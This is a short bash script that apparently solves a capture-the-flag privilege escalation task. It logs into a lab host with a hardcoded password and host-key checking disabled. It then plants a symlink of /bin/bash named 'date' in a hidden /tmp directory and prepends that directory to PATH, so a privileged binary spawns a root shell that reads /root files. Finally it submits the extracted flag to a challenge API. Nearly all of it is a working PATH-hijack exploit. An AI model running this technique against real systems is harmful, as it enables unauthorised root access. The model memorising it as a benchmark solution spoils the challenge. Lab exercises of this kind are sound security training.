#!/usr/bin/env bash
set -euo pipefail

HOST=172.20.0.147
USER=deckhand
PASSWORD=frame69-orbit

remote_output=$(sshpass -p "$PASSWORD" ssh -T \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "$USER@$HOST" \
  'mkdir -p /tmp/.frame-cache; ln -sf /bin/bash /tmp/.frame-cache/date; PATH=/tmp/.frame-cache:$PATH /usr/local/bin/clock-dispatch -p -c "cat /root/flag; cat /root/.escalation-proof"')
printf '%s\n' "$remote_output"

flag=$(printf '%s' "$remote_output" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}\r\n]+\}", sys.stdin.read()); print(m.group(0) if m else ""); sys.exit(0 if m else 1)')
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-69e1cc\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
